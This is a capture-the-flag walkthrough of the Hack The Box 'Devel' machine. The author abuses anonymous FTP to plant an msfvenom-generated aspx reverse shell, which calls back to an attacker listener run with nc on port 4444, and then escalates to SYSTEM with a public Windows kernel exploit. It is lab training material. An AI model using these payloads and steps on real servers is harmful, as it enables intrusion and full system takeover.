Devel was more of a learning experience than the previous boxes. 

It got me reading about Windows privilege escalation, for which I found a [great post by FuzzySecurity](http://www.fuzzysecurity.com/tutorials/16.html).

Also, I'll be trying to get through boxes without Metasploit and the meterpreter shell from now on as much as possible, since the OSCP only lets you use it on one exam machine.

Starting off with `nmap -A -T4 -Pn 10.10.10.5`:

<img src="/assets/images/htb-devel/nmap.png">

We have port 21 (FTP) and port 80 open. Port 80 has HTTP web server information in its header, showing us that the machine is running Microsoft IIS7 (and visiting 10.10.10.5 in a browser pulls up the IIS7 default landing page).

Additionally, anonymous FTP login is allowed. Red flag. Checking it out reveals that we have access to the web server's working directory, which we can verify by navigating to the files in a browser. It looks like the web server loads aspx files, so let's try generating a reverse shell payload with `msfvenom`:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.95 LPORT=4444 -f aspx > shell.aspx`

And then put it in the web server directory through FTP:

<img src="/assets/images/htb-devel/ftp_put.png">

Next, `nc -nvlp 4444` to run a listener on port 4444 through netcat. 

Navigating to http://10.10.10.5/shell.aspx in the browser should pop a shell in our listening terminal.  (My progress stalled for a while here, until I realized that I was using a staged payload for the reverse shell, which netcat apparently doesn't handle well. I then switched to `windows/shell_reverse_tcp` and everything worked fine.)

<img src="/assets/images/htb-devel/whoami.png">

So we didn't get authority\system privileges. This means we need privilege escalation. Let's run `systeminfo` and find out what the machine is on:

<img src="/assets/images/htb-devel/systeminfo.png">

Also, `systeminfo` showed x86. This specific OS/build was vulnerable to [this privesc exploit](https://www.exploit-db.com/exploits/40564), which I compiled into an .exe using the instructions provided in the comments:

<img src="/assets/images/htb-devel/compile.png">

Now we can put the .exe into the web server root using FTP just like before:

<img src="/assets/images/htb-devel/ftp_put_exe.png">

Now, navigate to the web server root directory, run privesc.exe and let the exploit do its job:

<img src="/assets/images/htb-devel/privesc.png">

There's system.	Flags are in the standard directories:

<img src="/assets/images/htb-devel/flags.png">

Thanks for reading!
